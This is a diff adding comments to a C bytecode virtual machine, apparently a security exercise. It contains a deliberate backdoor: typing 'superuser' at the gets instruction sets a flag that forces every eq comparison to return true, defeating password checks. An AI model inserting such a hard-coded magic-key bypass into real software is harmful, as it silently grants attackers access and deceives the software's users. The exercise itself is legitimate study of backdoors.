@@ -14,7 +14,7 @@
 static bool is_running = true;
 static bool backdoor = false; // Whether the backdoor is open or not.
 
-// Instruction functions
+// 14 Instruction functions
 void inst_halt(struct VMContext* ctx __attribute__((unused)), const uint32_t instr __attribute__((unused))){
 	exit(0);
 }
@@ -81,6 +81,7 @@ void inst_eq(struct VMContext* ctx, const uint32_t instr){
 	const uint8_t b = EXTRACT_B1(instr);
 	const uint8_t c = EXTRACT_B2(instr);
 	const uint8_t d = EXTRACT_B3(instr);
+	// When a backdoor key word is in, it always return 1 to reg
 	if((ctx->r[c].value == ctx->r[d].value) || backdoor)
 		ctx->r[b].value = 1;
 	else
@@ -122,6 +123,7 @@ void inst_gets(struct VMContext* ctx, const uint32_t instr){
 	char* backdoorKey = "superuser";
 	uint8_t idx = 0;
 	bool backdoorOpen = true;
+	// When a input is 'superuser', eq instr will be 1 always.
 	while(true){
 		*addr = getc(stdin);
 		if(*addr == '\n'){
@@ -201,6 +203,7 @@ int main(int argc, char** argv) {
         return 1;
     }
 
+	// Read a input file and set pc
 	uint32_t len;
 	fseek(bytecode, 0, SEEK_END);
 	len = ftell(bytecode);
@@ -210,6 +213,7 @@ int main(int argc, char** argv) {
 
 	while (is_running) {
         // TODO: Read 4-byte bytecode, and set the pc accordingly
+		// If instruction index is out of the bound with jump, it terminate
 		if(vm.instrIdx > len/4){
 			perror("An instruction index is out of the boundary\n");
 			free(pc);
